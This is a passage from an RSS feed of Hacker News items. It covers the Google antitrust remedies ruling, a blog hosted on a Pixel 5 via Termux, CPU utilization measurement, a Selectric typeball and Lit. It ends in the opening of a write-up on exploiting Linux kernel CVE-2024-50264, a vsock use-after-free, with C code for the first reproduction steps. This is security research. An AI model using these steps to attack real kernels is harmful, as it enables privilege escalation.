    &lt;p&gt;With all the wrinkles ironed out, everything has been working well now for over a month. I hope you√¢ve enjoyed following along and that this approach works for you too.&lt;/p&gt;
    &lt;p&gt;This post was discussed on Hacker News and Reddit.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45108066</guid></item><item><title>Google can keep its Chrome browser but will be barred from exclusive contracts</title><link>https://www.cnbc.com/2025/09/02/google-antitrust-search-ruling.html</link><description>&lt;doc fingerprint="19469cf013a53348"&gt;
  &lt;main&gt;
    &lt;p&gt;Alphabet shares popped 8% in extended trading as investors celebrated what they viewed as minimal consequences from a historic defeat last year in the landmark antitrust case.&lt;/p&gt;
    &lt;p&gt;Last year, Google was found to hold an illegal monopoly in its core market of internet search.&lt;/p&gt;
    &lt;p&gt;U.S. District Judge Amit Mehta ruled against the most severe consequences that were proposed by the Department of Justice, including the forced sale of Google's Chrome browser, which provides data that helps its advertising business deliver targeted ads.&lt;/p&gt;
    &lt;p&gt;"Google will not be required to divest Chrome; nor will the court include a contingent divestiture of the Android operating system in the final judgment," the decision stated. "Plaintiffs overreached in seeking forced divestiture of these key assets, which Google did not use to effect any illegal restraints."&lt;/p&gt;
    &lt;p&gt;Mehta, who oversaw the remedies trial in May, ordered the parties to meet by Sept. 10 for the final judgment.&lt;/p&gt;
    &lt;p&gt;In August 2024, the U.S. District Court for the District of Columbia ruled that Google violated Section 2 of the Sherman Act and held a monopoly in search and related advertising.&lt;/p&gt;
    &lt;p&gt;The antitrust trial started in September 2023.&lt;/p&gt;
    &lt;p&gt;"Now the Court has imposed limits on how we distribute Google services, and will require us to share Search data with rivals," Google said in a blog post. "We have concerns about how these requirements will impact our users and their privacy, and we're reviewing the decision closely. The Court did recognize that divesting Chrome and Android would have gone beyond the case's focus on search distribution, and would have harmed consumers and our partners."&lt;/p&gt;
    &lt;p&gt;One of the key areas of focus was the exclusive contracts Google held for distribution.&lt;/p&gt;
    &lt;p&gt;In his decision Tuesday, Mehta said the company can make payments to preload products, but it cannot have exclusive contracts that condition payments or licensing.&lt;/p&gt;
    &lt;p&gt;The DOJ had asked Google to stop the practice of "compelled syndication," which refers to the practice of making certain deals with companies to ensure its search engine remains the default choice in browsers and smartphones.&lt;/p&gt;
    &lt;p&gt;"The court's ruling today recognizes the need for remedies that will pry open the market for general search services, which has been frozen in place for over a decade," the DOJ said in a press release. "The ruling also recognizes the need to prevent Google from using the same anticompetitive tactics for its GenAI products as it used to monopolize the search market, and the remedies will reach GenAI technologies and companies."&lt;/p&gt;
    &lt;p&gt;Google pays Apple billions of dollars per year to be the default search engine on iPhones. It's lucrative for Apple and a valuable way for Google to get more search volume and users.&lt;/p&gt;
    &lt;p&gt;Apple stock rose 4% on Tuesday after hours.&lt;/p&gt;
    &lt;p&gt;"Google will not be barred from making payments or offering other consideration to distribution partners for preloading or placement of Google Search, Chrome, or its GenAI products. Cutting off payments from Google almost certainly will impose substantial‚Äîin some cases, crippling‚Äîdownstream harms to distribution partners, related markets, and consumers, which counsels against a broad payment ban."&lt;/p&gt;
    &lt;p&gt;Google was also ordered to loosen its hold on search data.&lt;/p&gt;
    &lt;p&gt;During the remedies trial in May, the DOJ asked the judge to force Google to share the data it uses for generating search results, such as data about what users click on.&lt;/p&gt;
    &lt;p&gt;Mehta ruled Tuesday that Google will have to make available certain search index data and user interaction data, though "not ads data."&lt;/p&gt;
    &lt;p&gt;Google does not have to share or provide access to granular data with advertisers.&lt;/p&gt;
    &lt;p&gt;The court narrowed the datasets Google will be required to share and said they must occur on "ordinary commercial terms that are consistent with Google's current syndication services."&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45108548</guid></item><item><title>This blog is running on a recycled Google Pixel 5 (2024)</title><link>https://blog.ctms.me/posts/2024-08-29-running-this-blog-on-a-pixel-5/</link><description>&lt;doc fingerprint="37c26d064887b8aa"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;This blog is running on a recycled Google Pixel 5&lt;/head&gt;
    &lt;p&gt;If you glance over this blog, you will see that I am an avid Android fan. After setting up numerous Linux &lt;code&gt;proot&lt;/code&gt; desktops on phones, I wanted to see if I use a phone as a server and run my blog from an Android phone. Since you are reading this, I was successful.&lt;/p&gt;
    &lt;p&gt;I was inspired my a few Mastodon posts earlier this week to give it a go. First, I stumbled on a post from @kaimac who is running a site from an ESP32 microcontroller. In the comments of that post, I saw a mention to compost.party created by user @computersandblues that runs completely on an Android device and a solar panel. Last, @stevelord who is essentially running a homelab on a TP-Link router with OpenWRT installed.&lt;/p&gt;
    &lt;p&gt;I think a lot about power consumption of my homelab and I also love using old hardware for random projects to give them new life. I was truly inspired by the above works, so I got right down to business.&lt;/p&gt;
    &lt;head rend="h2"&gt;The hardware&lt;/head&gt;
    &lt;p&gt;I looked through the devices I had laying around and I chose a Google Pixel 5 my brother-in-law gave me after he upgraded. The Pixel 5 is carrier locked to Verizon, which is notorious for making it impossible to also unlock the bootloader and install custom ROMs. At first I wanted a device that I could install PostmarketOS to run a proper Linux server. In the end, I‚Äôm glad I didn‚Äôt go that route.&lt;/p&gt;
    &lt;p&gt;Another reason I chose the Pixel 5 is because it supports USB-OTG and can use docks with hard-wired internet. I didn‚Äôt want to run the site on wifi and having an ethernet connection was mandatory.&lt;/p&gt;
    &lt;p&gt;Last, it is the most current phone I have. This device is open to the internet, so I wanted to make sure it is an updated as possible.&lt;/p&gt;
    &lt;head rend="h4"&gt;Solar powered blog!&lt;/head&gt;
    &lt;p&gt;This summer I‚Äôve been testing using a 100w solar panel I got from Harbor Freight Tools so I can learn more about how it all works before diving into larger projects. I have that panel connected to a Jackery 160w power station to keep it charged up and we use it to charge our mobile devices. I got the Jackery last year as a power bank I use while on jobsites.&lt;/p&gt;
    &lt;p&gt;Since I already have this set up, I am now using it to power this blog. I‚Äôm happy with this setup as I‚Äôve been getting more into permacomputing. Having a website that is fully offgrid using recycled parts is exciting!&lt;/p&gt;
    &lt;head rend="h2"&gt;What I used to create the site (Termux is the GOAT)&lt;/head&gt;
    &lt;p&gt;While considering what projects I could do with this phone, I was thinking I was going to install a &lt;code&gt;proot&lt;/code&gt; desktop and then run from within a Linux environment. Before I started I decided to check out a few packages that are in Termux (the flat out amazing terminal emulator) to see how far I could push it.&lt;/p&gt;
    &lt;p&gt;I checked for some basics and read about setting up an &lt;code&gt;ssh&lt;/code&gt; connection. Then I randomly searched for Hugo, which is what my blog was already built on. Sure enough, it is right there in the Termux repos! Turns out, it has been in there for a long time. I see a lot of posts from 2018 with people using it.&lt;/p&gt;
    &lt;head rend="h2"&gt;How has it been going&lt;/head&gt;
    &lt;p&gt;Great! Site is fast and reliable. I ran into a few hiccups on the first day or so, which were mostly around the version of Hugo on my server and the newer version I am using on the phone. The other is related to my solar setup and keeping an eye on the battery levels.&lt;/p&gt;
    &lt;p&gt;To be honest, I don‚Äôt think anyone can tell it is running on an Android phone instead of a x86 Linux box or a hyperscaler VPS.&lt;/p&gt;
    &lt;p&gt;At the moment I have no plans to change this setup and will leave it as-is until some issue arises. But, there‚Äôs really not much to report other than it works fantastic.&lt;/p&gt;
    &lt;p&gt;Below are my longform notes on how I set it up. But, the short version is it was way simpler than I thought it would be. You can get up and running with a Hugo site by just installing &lt;code&gt;git&lt;/code&gt;, &lt;code&gt;screen&lt;/code&gt;, your favorite text editor, and &lt;code&gt;hugo&lt;/code&gt; straight from the repos.&lt;/p&gt;
    &lt;p&gt;Not included in this post is how I add new posts to the phone. I can use &lt;code&gt;scp&lt;/code&gt; to send a files, but I prefer to use dufs that is a static file server in that can be accessed in the browser. Using &lt;code&gt;dufs&lt;/code&gt; I can upload files and make quick edits straight in the browser from any device. Surprise! &lt;code&gt;dufs&lt;/code&gt; is also in the Termux repos and is so easy to get up and running. Again, message me if you‚Äôd like to see a write-up about it.&lt;/p&gt;
    &lt;head rend="h2"&gt;Installs&lt;/head&gt;
    &lt;p&gt;Of course I need some basic utilities. These are the utilities I need to have at a minimum when working with a Linux system:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;rsync&lt;/item&gt;
      &lt;item&gt;openssh&lt;/item&gt;
      &lt;item&gt;git&lt;/item&gt;
      &lt;item&gt;wget&lt;/item&gt;
      &lt;item&gt;curl&lt;/item&gt;
      &lt;item&gt;fish shell&lt;/item&gt;
      &lt;item&gt;cronie&lt;/item&gt;
      &lt;item&gt;termux-services&lt;/item&gt;
      &lt;item&gt;iperf3&lt;/item&gt;
      &lt;item&gt;speedtest-go&lt;/item&gt;
      &lt;item&gt;screen&lt;/item&gt;
      &lt;item&gt;helix&lt;/item&gt;
      &lt;item&gt;hugo&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Restart Termux and use &lt;code&gt;sv-enable&lt;/code&gt; to run certain items as services. I do this for &lt;code&gt;sshd&lt;/code&gt; and &lt;code&gt;cronie&lt;/code&gt;. It looks like this:&lt;/p&gt;
    &lt;code&gt;$ sv-enable sshd
$ sv-enable cronie
&lt;/code&gt;
    &lt;p&gt;After running &lt;code&gt;sv-enable&lt;/code&gt;, restart Termux.&lt;/p&gt;
    &lt;head rend="h4"&gt;openssh&lt;/head&gt;
    &lt;p&gt;I could build all of this straight from the phone using either the touchscreen keyboard or connecting a standard keyboard and mouse either with a USB-C dock or bluetooth. But, I want to manage this like all of my other servers, which is to &lt;code&gt;ssh&lt;/code&gt; into the device and work from my desk.&lt;/p&gt;
    &lt;p&gt;There is an official guide for setting up an &lt;code&gt;ssh&lt;/code&gt; server. All I will add here is some pointers I learned along the way.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Adding an &lt;code&gt;ssh&lt;/code&gt;key is simple and should be one of the first steps done. After generating the key and importing with&lt;code&gt;ssh-copy-id&lt;/code&gt;from the desktop, edit the&lt;code&gt;sshd&lt;/code&gt;file in&lt;code&gt;$PREFIX/etc/ssh/sshd_config&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;Termux generates its own username and cannot be changed. Run &lt;code&gt;whoami&lt;/code&gt;to see what it is.&lt;/item&gt;
      &lt;item&gt;It is the same for the &lt;code&gt;ssh&lt;/code&gt;port. As far as I can tell you cannot change the port, which is automatically set to 8022.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Running the site&lt;/head&gt;
    &lt;p&gt;There are lots of guides out there on how to setup a &lt;code&gt;hugo&lt;/code&gt; site. I have an existing site that I migrated from a VM to this phone, so my notes do not include how to get a &lt;code&gt;hugo&lt;/code&gt; site running. I also do not need to do any port forwarding as I already have a reverse proxy that I just changed where it points for my blog.&lt;/p&gt;
    &lt;p&gt;I would like to hear feedback if there is a need to add those notes here. Message me on Mastodon or by email using the links at the bottom of this post.&lt;/p&gt;
    &lt;p&gt;Below are notes on how I use the package &lt;code&gt;cronie&lt;/code&gt; to start the blog using &lt;code&gt;screen&lt;/code&gt; and the automatically reload the blog occasionally. &lt;code&gt;cronie&lt;/code&gt; is for setting up &lt;code&gt;cron&lt;/code&gt; tasks. Once installed and enabled, run &lt;code&gt;crontab -e&lt;/code&gt; like usual to setup tasks.&lt;/p&gt;
    &lt;p&gt;This is how I do it.&lt;/p&gt;
    &lt;p&gt;First, set a &lt;code&gt;fish&lt;/code&gt; alias for the command to reload the blog:&lt;/p&gt;
    &lt;code&gt;alias blog_run='cd /data/data/com.termux/files/home/&amp;lt;website_root_dir&amp;gt; &amp;amp;&amp;amp; /data/data/com.termux/files/usr/bin/hugo serve --bind=0.0.0.0 --baseURL=https://blog.ctms.me --appendPort=false --environment=production --disableFastRender --cacheDir /data/data/com.termux/files/home/&amp;lt;website_root_dir&amp;gt;/cache'

funcsave blog_run
&lt;/code&gt;
    &lt;p&gt;Now, create a script and place in &lt;code&gt;~/scripts&lt;/code&gt; that closes a previous instance of &lt;code&gt;screen&lt;/code&gt;, clears the cache, and then starts a new &lt;code&gt;screen&lt;/code&gt; session titled ‚Äúhugo‚Äù and execute the alias:&lt;/p&gt;
    &lt;code&gt;#! /bin/bash
screen -X -S "hugo" quit
rm -rf /data/data/com.termux/files/home/&amp;lt;website_root_dir/cache/&amp;lt;site_name_dir&amp;gt;/filecache/getresource/
screen -S hugo -d -m fish -c 'blog_run; exec fish'
&lt;/code&gt;
    &lt;p&gt;Last, set it to run with &lt;code&gt;cron&lt;/code&gt;&lt;/p&gt;
    &lt;code&gt;*/5 * * * * cd /data/data/com.termux/files/home/scripts &amp;amp;&amp;amp; sh blog_reload.sh
&lt;/code&gt;
    &lt;head rend="h2"&gt;Backing up&lt;/head&gt;
    &lt;p&gt;Since Termux supports &lt;code&gt;ssh&lt;/code&gt; connections, I can use it on remote machines to pull the files from the phone using &lt;code&gt;rsync&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;First, need to install &lt;code&gt;rsync&lt;/code&gt; on the phone with &lt;code&gt;pkg install rsync&lt;/code&gt;.&lt;/p&gt;
    &lt;head rend="h4"&gt;Desktop backup&lt;/head&gt;
    &lt;p&gt;Now we can run it from my desktop to pull the files:&lt;/p&gt;
    &lt;code&gt;rsync -aP pixel:~/&amp;lt;website_root_dir&amp;gt; /local/dir/pixel_blog/
&lt;/code&gt;
    &lt;p&gt;On my desktop, I have this for &lt;code&gt;cron&lt;/code&gt;&lt;/p&gt;
    &lt;code&gt;@reboot sleep 30 &amp;amp;&amp;amp; rsync -aP pixel:~/&amp;lt;website_root_dir&amp;gt; /local/dir/pixel_blog/ &amp;gt;&amp;gt; $HOME/logs/pixel-hugo-backup.log 2&amp;gt;&amp;amp;1
&lt;/code&gt;
    &lt;head rend="h4"&gt;nas backup&lt;/head&gt;
    &lt;p&gt;This is the same configuration. The only difference is the backup location and the &lt;code&gt;cron&lt;/code&gt; timing.&lt;/p&gt;
    &lt;code&gt;rsync -aP pixel:~/&amp;lt;website_root_dir&amp;gt; /local/dir/pixel_blog
&lt;/code&gt;
    &lt;p&gt;The automation:&lt;/p&gt;
    &lt;code&gt;5 6 * * * rsync -aP pixel:~/&amp;lt;website_root_dir&amp;gt; /local/dir/pixel_blog &amp;gt;&amp;gt; $HOME/logs/pixel-hugo-backup.log 2&amp;gt;&amp;amp;1
&lt;/code&gt;
    &lt;head rend="h4"&gt;git backup&lt;/head&gt;
    &lt;p&gt;I have a local self-hosted git instance I push backups to, but you can totally set it up to send them to Github or whatever forge you use. No instructions here because there are plenty of guides out there on how to set this up.&lt;/p&gt;
    &lt;p&gt;- - - - -&lt;/p&gt;
    &lt;p&gt;Thank you for reading! If you would like to comment on this post you can start a conversation on the Fediverse. Message me on Mastodon at @cinimodev@masto.ctms.me. Or, you may email me at blog.discourse904@8alias.com. This is an intentionally masked email address that will be forwarded to the correct inbox.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45110209</guid></item><item><title>%CPU utilization is a lie</title><link>https://www.brendanlong.com/cpu-utilization-is-a-lie.html</link><description>&lt;doc fingerprint="7287344734add095"&gt;
  &lt;main&gt;
    &lt;p&gt;I deal with a lot of servers at work, and one thing everyone wants to know about their servers is how close they are to being at max utilization. It should be easy, right? Just pull up &lt;code&gt;top&lt;/code&gt; or another system monitor tool, look at network, memory and CPU utilization, and whichever one is the highest tells you how close you are to the limits.&lt;/p&gt;
    &lt;p&gt;And yet, whenever people actually try to project these numbers, they find that CPU utilization doesn't quite increase linearly. But how bad could it possibly be?&lt;/p&gt;
    &lt;p&gt;To answer this question, I ran a bunch of stress tests and monitored both how much work they did and what the system-reported CPU utilization was, then graphed the results.&lt;/p&gt;
    &lt;head rend="h1"&gt;Setup&lt;/head&gt;
    &lt;p&gt;For my test machine, I used a desktop computer running Ubuntu with a Ryzen 9 5900X (12 core / 24 thread) processor. I also enabled Precision Boost Overdrive (i.e. Turbo).&lt;/p&gt;
    &lt;p&gt;I vibe-coded a script that runs stress-ng in a loop, first using 24 workers and attempting to run them each at different utilizations from 1% to 100%, then using 1 to 24 workers all at 100% utilization. It used different stress testing method and measured the number of operations that could be completed ("Bogo ops1").&lt;/p&gt;
    &lt;p&gt;The reason I did two different methods was that operating systems are smart about how they schedule work, and scheduling a small number of workers at 100% utilization can be done optimally (spoilers) but with 24 workers all at 50% utilization it's hard for the OS to do anything other than spreading the work evenly.&lt;/p&gt;
    &lt;head rend="h1"&gt;Results&lt;/head&gt;
    &lt;p&gt;You can see the raw CSV results here.&lt;/p&gt;
    &lt;head rend="h2"&gt;General CPU&lt;/head&gt;
    &lt;p&gt;The most basic test just runs all of stress-ng's CPU stress tests in a loop.&lt;/p&gt;
    &lt;p&gt;You can see that when the system is reporting 50% CPU utilization, it's actually doing 60-65% of the actual maximum work it can do.&lt;/p&gt;
    &lt;head rend="h2"&gt;64-bit Integer Math&lt;/head&gt;
    &lt;p&gt;But maybe that one was just a fluke. What if we just run some random math on 64-bit integers?&lt;/p&gt;
    &lt;p&gt;This one is even worse! At "50% utilization", we're actually doing 65-85% of the max work we can get done. It can't possibly get worse than that though, right?&lt;/p&gt;
    &lt;head rend="h2"&gt;Matrix Math&lt;/head&gt;
    &lt;p&gt;Something is definitely off. Doing matrix math, "50% utilization" is actually 80% to 100% of the max work that can be done.&lt;/p&gt;
    &lt;p&gt;In case you were wondering about the system monitor screenshot from the start of the article, that was a matrix math test running with 12 workers, and you can see that it really did report 50% utilization even though additional workers do absolutely nothing (except make the utilization number go up).&lt;/p&gt;
    &lt;head rend="h1"&gt;What's Going On?&lt;/head&gt;
    &lt;head rend="h2"&gt;Hyperthreading&lt;/head&gt;
    &lt;p&gt;You might notice that this the graph keeps changing at 50%, and I've helpfully added piecewise linear regressions showing the fit.&lt;/p&gt;
    &lt;p&gt;The main reason this is happening is hyperthreading: Half of the "cores" on this machine (and most machines) are sharing resources with other cores. If I run 12 workers on this machine, they each get scheduled on their own physical core with no shared resources, but once I go over that, each additional worker is sharing resources with another. In some cases (general CPU benchmarks), this makes things slightly worse, and in some cases (SIMD-heavy matrix math), there are no useful resources left to share.&lt;/p&gt;
    &lt;head rend="h2"&gt;Turbo&lt;/head&gt;
    &lt;p&gt;It's harder to see, but Turbo is also having an effect. This particular processor runs at 4.9 GHz at low utilization, but slowly drops to 4.3 GHz as more cores become active2.&lt;/p&gt;
    &lt;p&gt;Note the zoomed-in y-axis. The clock speed "only" drops by 15% on this processor.&lt;/p&gt;
    &lt;p&gt;Since CPU utilization is calculated as busy cycles / total cycles, this means the denominator is getting smaller as the numerator gets larger, so we get yet another reason why actual CPU utilization increases faster than linearly.&lt;/p&gt;
    &lt;head rend="h1"&gt;Does This Matter?&lt;/head&gt;
    &lt;p&gt;If you look at CPU utilization and assume it will increase linearly, you're going to have a rough time. If you're using the CPU efficiently (running above "50%" utilization), the reported utilization is an underestimate, sometimes significantly so.&lt;/p&gt;
    &lt;p&gt;And keep in mind that I've only shown results for one processor, but hyperthreading performance and Turbo behavior can vary wildly between different processors, especially from different companies (AMD vs Intel).&lt;/p&gt;
    &lt;p&gt;The best way I know to work around this is to run benchmarks and monitor actual work done:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Benchmark how much work your server can do before having errors or unacceptable latency.&lt;/item&gt;
      &lt;item&gt;Report how much work your server is currently doing.&lt;/item&gt;
      &lt;item&gt;Compare those two metrics instead of CPU utilization.&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;Bogo ops is presumably a reference to BogoMIPS, a "bogus" benchmark that Linux does at startup to very roughly understand CPU performance.√Ç √¢¬©&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;One of the main constraints processors operate under is needing to dissipate heat fast enough. When only one core is running, the processor can give that core some of the heat headroom that other cores aren't using and run it faster, but it can't do that all of the cores are running.Power usage works similarly and can be a constraint in some environments (usually not in a desktop computer, but frequently in servers).√Ç √¢¬©&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45110688</guid></item><item><title>Comic Sans typeball designed to work with the IBM Selectric typewriters</title><link>https://www.printables.com/model/441233-comic-sans-typeball-for-the-ibm-selectric-typewrit</link><description>&lt;doc fingerprint="16569da08d87a55b"&gt;
  &lt;main&gt;
    &lt;p&gt;&lt;lb/&gt;Update, July 7 2023: Dave Hayden took the resin-printed typeball concept and improved on it greatly. I'm extremely grateful that he took on all the hard work of iteratively going through and dialing in the perfect values to make a functional ball, and I'm pleased to think I contributed in some way to his achievements.&lt;/p&gt;
    &lt;p&gt;-----------------------------------------&lt;lb/&gt;This is a Comic Sans typeball designed to work with the IBM Selectric typewriters that take 88-character type elements. More information about the 3D printed typeballs can be found at the Github repo for the project.&lt;lb/&gt;I have not yet printed and tested this exact model! I tested a previous revision which was just a bit too tall and 90√Ç¬∞ off; I've corrected the letter rotations and shaved 0.2 mm off the height.&lt;lb/&gt;To affix the typeball to the typewriter, you will need a small clip such as this one or a bent wire.&lt;lb/&gt;The blank ball (not the letters) is an edited version of the OpenSCAD Selectric Typeball by 1944GPW and is licensed with the Creative Commons - Attribution license.&lt;/p&gt;
    &lt;p&gt;The author marked this model as their own original creation.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45111909</guid></item><item><title>Lit: a library for building fast, lightweight web components</title><link>https://lit.dev</link><description>&lt;doc fingerprint="bcd9ca526b0d36ea"&gt;
  &lt;main&gt;&lt;p&gt;Simple. Fast. Web Components.&lt;/p&gt;&lt;head rend="h1"&gt;Simple&lt;/head&gt;&lt;p&gt;Skip the boilerplate&lt;/p&gt;&lt;p&gt;Building on top of the Web Components standards, Lit adds just what you need to be happy and productive: reactivity, declarative templates and a handful of thoughtful features to reduce boilerplate and make your job easier. Every Lit feature is carefully designed with web platform evolution in mind.&lt;/p&gt;&lt;head rend="h1"&gt;Fast&lt;/head&gt;&lt;p&gt;Tiny footprint, instant updates&lt;/p&gt;&lt;p&gt;Weighing in at around 5 KB (minified and compressed), Lit helps keep your bundle size small and your loading time short. And rendering is blazing fast, because Lit touches only the dynamic parts of your UI when updating ‚Äî no need to rebuild a virtual tree and diff it with the DOM.&lt;/p&gt;&lt;head rend="h1"&gt;Web Components&lt;/head&gt;&lt;p&gt;Interoperable &amp;amp; future-ready&lt;/p&gt;&lt;p&gt;Every Lit component is a native web component, with the superpower of interoperability. Web components work anywhere you use HTML, with any framework or none at all. This makes Lit ideal for building shareable components, design systems, or maintainable, future-ready sites and apps.&lt;/p&gt;&lt;head rend="h1"&gt;Custom Elements&lt;/head&gt;&lt;p&gt;Lit components are standard custom elements, so the browser treats them exactly like built-in elements. Use them in hand-written HTML or framework code, output them from your CMS or static site builder, even create instances in JavaScript ‚Äî they just work!&lt;/p&gt;&lt;head rend="h1"&gt;Scoped styles&lt;/head&gt;&lt;p&gt;Lit scopes your styles by default, using Shadow DOM. This keeps your CSS selectors simple and ensures that your component‚Äôs styles don't affect ‚Äî and aren't affected by ‚Äî any other styles on the page.&lt;/p&gt;&lt;head rend="h1"&gt;Reactive properties&lt;/head&gt;&lt;p&gt;Declare reactive properties to model your component‚Äôs API and internal state. A Lit component efficiently re-renders whenever a reactive property (or corresponding HTML attribute) changes.&lt;/p&gt;&lt;head rend="h1"&gt;Declarative templates&lt;/head&gt;&lt;p&gt;Lit templates, based on tagged template literals, are simple, expressive and fast, featuring HTML markup with native JavaScript expressions inline. No custom syntax to learn, no compilation required.&lt;/p&gt;&lt;head rend="h1"&gt;Build anything with Lit&lt;/head&gt;&lt;head rend="h2"&gt;Shareable Components&lt;/head&gt;&lt;p&gt;Need to deliver interactive content or features that drop into any site, built on any stack? Because they're natively supported by browsers, web components are the perfect solution ‚Äî and Lit makes them easy to build.&lt;/p&gt;&lt;head rend="h2"&gt;Design Systems&lt;/head&gt;&lt;p&gt;A design system helps you create experiences that are consistently excellent and on brand. But what if your organization uses multiple frameworks? With Lit, you can build one set of components that works for every team.&lt;/p&gt;&lt;head rend="h2"&gt;Sites and Apps&lt;/head&gt;&lt;p&gt;Use Lit components to progressively enhance a static site, or build an entire app. By embracing Web Components, Lit minimizes lock-in and promotes maintainability: update or migrate one component at a time, without disrupting product development.&lt;/p&gt;&lt;head rend="h1"&gt;Many of the world's most forward-looking organizations are building with Lit&lt;/head&gt;&lt;head rend="h1"&gt;Explore Lit&lt;/head&gt;&lt;head rend="h2"&gt;Try our live tutorials ‚Äî no installation needed&lt;/head&gt;Tutorials&lt;head rend="h2"&gt;Tinker with our interactive examples&lt;/head&gt;Playground&lt;head rend="h2"&gt;Dive deep with our extensive docs&lt;/head&gt;Documentation&lt;head rend="h2"&gt;Check out all the options for jumping in&lt;/head&gt;Get started&lt;head rend="h1"&gt;Connect with Lit and the web components community&lt;/head&gt;&lt;p&gt;Stay up to date with new releases, learn more about how to use web components and share projects and feedback with our team. All community participation is subject to Lit‚Äôs Code of Conduct ‚Äî be excellent to each other!&lt;/p&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45112720</guid></item><item><title>Kernel-hack-drill and exploiting CVE-2024-50264 in the Linux kernel</title><link>https://a13xp0p0v.github.io/2025/09/02/kernel-hack-drill-and-CVE-2024-50264.html</link><description>&lt;doc fingerprint="ae39595a94828b81"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Kernel-hack-drill and a new approach to exploiting CVE-2024-50264 in the Linux kernel&lt;/head&gt;
    &lt;p&gt;Some memory corruption bugs are much harder to exploit than others. They can involve race conditions, crash the system, and impose limitations that make a researcher's life difficult. Working with such fragile vulnerabilities demands significant time and effort. CVE-2024-50264 in the Linux kernel is one such hard bug, which received the Pwnie Award 2025 as the Best Privilege Escalation. In this article, I introduce my personal project kernel-hack-drill and show how it helped me to exploit CVE-2024-50264.&lt;/p&gt;
    &lt;head rend="h2"&gt;Bug collision story&lt;/head&gt;
    &lt;p&gt;I first found a bug in &lt;code&gt;AF_VSOCK&lt;/code&gt; back in 2021 and published the article Four Bytes of Power: Exploiting CVE-2021-26708 in the Linux kernel. In April 2024, I was fuzzing this kernel subsystem with a customized syzkaller and found another crash in &lt;code&gt;AF_VSOCK&lt;/code&gt;. I minimized the crash reproducer and disabled KASAN. This resulted in an immediate null-ptr-deref in a kernel worker (&lt;code&gt;kworker&lt;/code&gt;). Convinced the path forward would be painful, I shelved the bug. This was a wrong decision.&lt;/p&gt;
    &lt;p&gt;Later, in autumn 2024, I decided to look at this bug again and got promising results. Then, one calm evening, I realized I'd collided with Hyunwoo Kim (@v4bel) and Wongi Lee (@qwerty): they'd already disclosed the bug as CVE-2024-50264 and used it at kernelCTF. Their patch turned my PoC exploit into a null-ptr-deref:&lt;/p&gt;
    &lt;p&gt;Anyone who has dealt with a bug collision can imagine what I felt. I was wondering whether to keep digging into this vulnerability or just give it up.&lt;/p&gt;
    &lt;p&gt;Viktor Vasnetsov: Vityaz at the Crossroads (1882)&lt;/p&gt;
    &lt;p&gt;The exploit strategy by @v4bel and @qwerty looked very complicated. I had other ideas, so I decided to continue my research. I chose Ubuntu Server 24.04 with a fresh OEM/HWE kernel (v6.11) as the target for my PoC exploit.&lt;/p&gt;
    &lt;head rend="h2"&gt;CVE-2024-50264 analysis&lt;/head&gt;
    &lt;p&gt;The vulnerability CVE-2024-50264 was introduced in August 2016 by commit 06a8fc78367d in Linux v4.8. It is a race condition in &lt;code&gt;AF_VSOCK&lt;/code&gt; sockets that happens between the &lt;code&gt;connect()&lt;/code&gt; system call and a POSIX signals, resulting in a use-after-free (UAF). An unprivileged user can trigger this bug without user namespaces, which makes it more dangerous.&lt;/p&gt;
    &lt;p&gt;The kernel uses a freed &lt;code&gt;virtio_vsock_sock&lt;/code&gt; object. Its size is 80 bytes, which is suitable for the &lt;code&gt;kmalloc-96&lt;/code&gt; slab cache. The memory corruption is a UAF write executed by a kernel worker.&lt;/p&gt;
    &lt;p&gt;However, this vulnerability also brings a bunch of nasty limitations for exploitation. I can say that it's the worst bug to exploit I've ever seen. The Pwnie Award is well-deserved. I'll outline those constraints shortly.&lt;/p&gt;
    &lt;head rend="h2"&gt;Reproducing the bug using an "immortal signal"&lt;/head&gt;
    &lt;p&gt;First, an attacker should create a listening virtual socket (server vsock):&lt;/p&gt;
    &lt;code&gt;int ret = -1;
int vsock1 = 0;

vsock1 = socket(AF_VSOCK, SOCK_STREAM, 0);
if (vsock1 &amp;lt; 0)
	err_exit("[-] creating vsock");

ret = bind(vsock1, (struct sockaddr *)&amp;amp;addr, sizeof(struct sockaddr_vm));
if (ret != 0)
	err_exit("[-] binding vsock");

ret = listen(vsock1, 0); /* backlog = 0 */
if (ret != 0)
	err_exit("[-] listening vsock");
&lt;/code&gt;
    &lt;p&gt;Then the attacker should try to open a connection from a client vsock:&lt;/p&gt;
    &lt;code&gt;#define UAF_PORT 0x2712

int vsock2 = 0;
struct sockaddr_vm addr = {
	.svm_family = AF_VSOCK,
	.svm_port = UAF_PORT,
	.svm_cid = VMADDR_CID_LOCAL
};

vsock2 = socket(AF_VSOCK, SOCK_STREAM, 0);
if (vsock2 &amp;lt; 0)
	err_exit("[-] creating vsock");

ret = connect(vsock2, (struct sockaddr *)&amp;amp;addr, sizeof(struct sockaddr_vm));
&lt;/code&gt;
